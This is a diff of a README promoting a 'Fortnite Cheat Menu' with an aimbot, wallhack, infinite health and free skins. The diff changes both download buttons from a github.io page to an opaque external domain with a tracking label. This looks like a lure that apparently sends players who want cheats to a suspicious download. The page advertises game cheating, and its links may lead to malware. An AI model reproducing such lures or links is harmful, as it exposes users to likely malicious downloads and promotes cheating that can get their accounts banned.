@@ -2,7 +2,7 @@
 
 The **Fortnite Cheat Menu** is the ultimate tool for players looking to gain an edge in the competitive world of Fortnite. With powerful features like aimbot, wallhack, infinite health, and speed boost, you can dominate the battlefield and become a top-tier player in no time. Whether you're looking to improve your accuracy, outmaneuver enemies, or unlock exclusive skins, the Fortnite Cheat Menu offers all the cheats you need to enhance your gameplay and take your Fortnite experience to the next level.
 
-[![Download Fortnite CheatMenu](https://img.shields.io/badge/Download-Fortnite%20CheatMenu-blueviolet)](https://fortnite-cheat-menu.github.io/.github/)
+[![Download Fortnite CheatMenu](https://img.shields.io/badge/Download-Fortnite%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -50,4 +50,4 @@ The **Fortnite Cheat Menu** is the ultimate tool for players looking to gain an 
 4. **Activate the Features** you want, such as aimbot, wallhack, or speed boost, and enjoy the enhanced gameplay.
 5. **Dominate the Battle**: With your new abilities, eliminate opponents, outsmart your enemies, and claim victory in every match.
 
-[![Download Fortnite CheatMenu](https://img.shields.io/badge/Download-Fortnite%20CheatMenu-blueviolet)](https://fortnite-cheat-menu.github.io/.github/)
+[![Download Fortnite CheatMenu](https://img.shields.io/badge/Download-Fortnite%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
